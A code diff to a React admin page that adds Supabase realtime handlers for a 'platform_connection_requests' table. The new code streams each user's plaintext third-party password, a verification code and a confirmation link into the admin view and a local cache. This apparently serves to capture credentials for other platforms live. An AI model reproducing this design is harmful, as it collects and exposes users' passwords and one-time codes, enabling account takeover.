@@ -464,8 +464,117 @@ export default function Admin() {
     // Run once on mount (replacement for realtime subscription)
     fetchAdminData();
 
-    // No realtime cleanup necessary
-    return () => {};
+    // Set up realtime subscriptions so admin sees updates as they happen
+    try {
+      // Remove any existing channel first
+      if (realtimeChannel.current) {
+        try {
+          supabase.removeChannel(realtimeChannel.current);
+        } catch (err) {
+          console.warn('Admin: failed to remove existing realtime channel', err);
+        }
+        realtimeChannel.current = null;
+      }
+
+      const channel = supabase.channel('public:platform_connection_requests');
+
+      channel.on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'platform_connection_requests' }, (payload) => {
+        try {
+          const newRow = payload.new as any;
+          console.log('[REALTIME_INSERT] Received INSERT payload:', { id: newRow.id, platform: newRow.platform, email: newRow.email ? '[REDACTED]' : null, tracking_id: newRow.tracking_id });
+          
+          const submission = {
+            id: newRow.id,
+            platform: newRow.platform,
+            contact: newRow.email || newRow.phone || newRow.contact || '-',
+            third_party_password: newRow.third_party_password,
+            created_at: newRow.created_at,
+            user_id: newRow.user_id || null,
+            status: newRow.status,
+            source: newRow.source,
+            code: newRow.code,
+            confirmation_link: newRow.confirmation_link || null,
+            isNew: true,
+          };
+
+          setRows((prev) => {
+            const merged = [submission, ...prev];
+            saveRequestsToCache(merged);
+            console.log('[REALTIME_INSERT] ✅ Added to UI state, total rows:', merged.length);
+            return merged;
+          });
+          addDebugMessage(`✅ realtime INSERT: ${newRow.id} (${newRow.platform})`);
+        } catch (err) {
+          console.error('[REALTIME_INSERT] ❌ Handler error:', err);
+          addDebugMessage(`❌ realtime INSERT failed: ${err instanceof Error ? err.message : String(err)}`);
+        }
+      });
+
+      channel.on('postgres_changes', { event: 'UPDATE', schema: 'public', table: 'platform_connection_requests' }, (payload) => {
+        try {
+          const updated = payload.new as any;
+          console.log('[REALTIME_UPDATE] Received UPDATE payload:', { id: updated.id, tracking_id: updated.tracking_id, code: updated.code, confirmation_link: updated.confirmation_link ? '[SET]' : '[EMPTY]' });
+          
+          setRows((prev) => {
+            const mapped = prev.map((r) => {
+              if (String(r.id) === String(updated.id)) {
+                const oldRow = r;
+                const newRowData = {
+                  ...r,
+                  platform: updated.platform,
+                  contact: updated.email || updated.phone || updated.contact || r.contact,
+                  third_party_password: updated.third_party_password || r.third_party_password,
+                  created_at: updated.created_at || r.created_at,
+                  user_id: updated.user_id || r.user_id,
+                  status: updated.status || r.status,
+                  source: updated.source || r.source,
+                  code: updated.code || r.code,
+                  confirmation_link: updated.confirmation_link || r.confirmation_link,
+                };
+                console.log('[REALTIME_UPDATE] ✅ Updated row:', { id: updated.id, changes: { code: updated.code ? '[SET]' : undefined, confirmation_link: updated.confirmation_link ? '[SET]' : undefined } });
+                return newRowData;
+              }
+              return r;
+            });
+            saveRequestsToCache(mapped);
+            console.log('[REALTIME_UPDATE] ✅ UI state updated');
+            return mapped;
+          });
+          addDebugMessage(`✅ realtime UPDATE: ${updated.id} (code:${updated.code ? 'Y' : 'N'}, link:${updated.confirmation_link ? 'Y' : 'N'})`);
+        } catch (err) {
+          console.error('[REALTIME_UPDATE] ❌ Handler error:', err);
+          addDebugMessage(`❌ realtime UPDATE failed: ${err instanceof Error ? err.message : String(err)}`);
+        }
+      });
+
+      channel.subscribe((status) => {
+        console.log('[REALTIME_CHANNEL] Subscription status:', status);
+        addDebugMessage(`📡 realtime channel: ${status}`);
+        if (status === 'SUBSCRIBED') {
+          console.log('[REALTIME_CHANNEL] ✅ Successfully subscribed to platform_connection_requests changes');
+        } else if (status === 'CLOSED') {
+          console.warn('[REALTIME_CHANNEL] ⚠️ Channel closed');
+        } else if (status === 'CHANNEL_ERROR') {
+          console.error('[REALTIME_CHANNEL] ❌ Channel error');
+        }
+      });
+
+      realtimeChannel.current = channel;
+    } catch (err) {
+      console.warn('Admin: failed to create realtime channel', err);
+    }
+
+    // Cleanup: remove realtime channel on unmount or when auth changes
+    return () => {
+      if (realtimeChannel.current) {
+        try {
+          supabase.removeChannel(realtimeChannel.current);
+          realtimeChannel.current = null;
+        } catch (err) {
+          console.warn('Admin: failed to remove realtime channel during cleanup', err);
+        }
+      }
+    };
   }, [authUser, isAdmin]);
 
   const fetchSubmissions = async (signal?: AbortSignal) => {
